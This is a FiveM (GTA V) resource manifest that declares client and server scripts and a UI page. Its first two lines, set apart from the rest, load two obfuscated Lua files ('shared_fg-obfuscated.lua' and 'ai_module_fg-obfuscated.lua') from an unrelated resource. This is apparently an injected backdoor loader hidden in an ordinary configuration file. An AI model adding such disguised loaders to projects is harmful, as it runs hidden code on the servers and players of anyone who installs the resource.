shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'





game 'gta5'
fx_version 'cerulean'
lua54 'yes'
author 'discord.gg/reduce-store'
version '1.0.0'
ui_page 'client/index.html'
client_script {
    'client/main.lua'
}
server_script "server/main.lua"
files {
    'client/index.html'
}